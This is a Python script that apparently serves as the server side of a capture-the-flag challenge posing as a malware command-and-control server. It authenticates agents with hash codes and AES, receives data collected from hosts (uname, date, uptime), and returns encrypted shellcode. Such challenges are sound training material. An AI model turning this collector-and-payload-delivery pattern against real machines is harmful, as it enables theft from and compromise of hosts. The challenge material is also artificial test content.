#!/usr/bin/env python3


import sys
import socket
import threading
import logging
import os
from Crypto.Cipher import AES
import gost3411_12
import random
import binascii
import atexit
import struct
import util


self_addr = "not-a-malware.tasks.open.kksctf.ru"


config = {
    'addr': ('0.0.0.0', 2000),
    'max_listen': 10,
    'timeout': 120, # this should be somewhat around 2 minutes in production
    'shellcode_file': 'shellcode.bin',
    'agent_hashcode': b'a7ea7adca75cfa93bf54cb0c7dfaabfd783f8bfe326469995f1ddd81de66b663', # simple prevention from patching
    'agent_hello': b"i'm alive: notamalware bot v2" + b"\x00"*3
}


# TODO: add new headers if there is new payload
GRABBER_HEADERS = {
    0x00: b'uname:',
    0x10: b'date:',
    0x11: b'uptime:'
}


shellcode = open(config['shellcode_file'], 'rb').read()


mainSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mainSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
mainSocket.bind(config['addr'])
mainSocket.settimeout(config['timeout'])
mainSocket.listen(config['max_listen'])


def get_thread_name(thread):
    return thread.getName()


def get_current_thread_name():
    return "<{}>".format(threading.current_thread().getName())


def thread_print(*args, **kwargs):
    print(get_current_thread_name(), *args, **kwargs)


def check_for_dead_threads(threads: list):
    for i in threads[:]:
        if not i.is_alive():
            threads.remove(i)
            thread_print("removed {} from threads list (dead)".format(get_thread_name(i)))


def generate_aes_key():
    return os.urandom(16)


def parse_header(header: bytes):
    return dict(zip(['data_type', 'data_len', 'data_crc'], struct.unpack("=HII", header)))


def parse_grabbed(conn: socket.socket, aes: AES.AESCipher):
    sig_from_client = conn.recv(32)
    chunked_data_len = struct.unpack("<q", conn.recv(8))[0]

    total_data = b""
    while chunked_data_len > 0:
        chunk = aes.decrypt(conn.recv(1024))
        total_data += chunk
        chunked_data_len -= 1024

    g = gost3411_12.GOST341112(digest_size=256)
    g.update(total_data)
    assert sig_from_client == bytearray(i ^ 0xAA for i in g.digest())

    while len(total_data) > 0:
        cut = 10
        header = parse_header(total_data[:cut])
        total_data = total_data[cut:]
        if list(header.values()) == [65535, 0, 0]:
            thread_print('got terminator-header, terminating...')
            break

        cut = header['data_len']
        grabbed_by_header = total_data[:cut]
        total_data = total_data[cut:]

        assert binascii.crc32(grabbed_by_header) == header['data_crc']
        assert grabbed_by_header.startswith(GRABBER_HEADERS[header['data_type']])
        print(grabbed_by_header.decode())


    assert any(i == 0xcc for i in total_data) # there must be only 0xcc's
    return True


def get_actual_pass():
    return util.generate_otp().encode()


def prepare_shellcode(aes_key: bytes, aes_iv: bytes) -> bytes:
    sc = shellcode.replace(b'A'*8, get_actual_pass())
    aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    return aes.encrypt(sc)


def handle(conn: socket.socket, addr):
    agent_hashcode = conn.recv(32)
    if binascii.hexlify(agent_hashcode) != config['agent_hashcode']:
        try:
            if agent_hashcode.decode().isprintable():
                thread_print('1')
        except:
            thread_print('got connection with wrong hash: {}'.format(binascii.hexlify(agent_hashcode)))
        conn.close()
        return
    thread_print('got valid agent hashcode')
    session_aes_key = generate_aes_key()
    thread_print('aes key: ' + binascii.hexlify(session_aes_key).decode())
    conn.send(session_aes_key)

    agent_hello_enc = conn.recv(32)
    agent_hello = AES.AESCipher(session_aes_key).decrypt(agent_hello_enc)
    assert agent_hello == config['agent_hello']

    agent_hashcode_xored_encrypted = conn.recv(32)
    agent_hashcode_xored = AES.AESCipher(session_aes_key).decrypt(agent_hashcode_xored_encrypted)
    agent_hashcode = binascii.hexlify(bytes(i ^ 0x55 for i in agent_hashcode_xored))
    if agent_hashcode != config['agent_hashcode']:
        thread_print('got connection with wrong xored encrypted hash: {}'.format(agent_hashcode))
        conn.close()
        return
    thread_print('got valid agent xored encrypted hashcode')

    grabbed_data_aes = AES.new(session_aes_key, AES.MODE_CBC, agent_hello_enc[:16])
    try:
        thread_print('trying to parse...')
        assert parse_grabbed(conn, grabbed_data_aes)
    except Exception as e:
        thread_print('got exception when parsing grabbed data: {}'.format(e))
        conn.close()
        return
    thread_print('got and parsed valid grabbed data')

    shellcode_iv = generate_aes_key()
    sc = prepare_shellcode(bytes([i^0x88 for i in session_aes_key]), shellcode_iv)
    conn.send(shellcode_iv + struct.pack("I", len(sc)))
    conn.send(sc)
    conn.close()
    return


def main():
    threads = list()
    while True:
        check_for_dead_threads(threads)
        #thread_print("waiting for connection...")
        try:
            conn, addr = mainSocket.accept()
            thread_print("connected {}, starting handler...".format(addr))
            t = threading.Thread(target=handle, args=(conn,addr))
            threads.append(t)
            t.start()
        except socket.timeout:
            #thread_print('no connections received in {}s'.format(config['timeout']))
            pass
        except KeyboardInterrupt:
            shutdown()


def shutdown():
    try:
        mainSocket.close()
    except:
        pass
    exit(0)


atexit.register(shutdown)


if __name__ == "__main__":
    main()

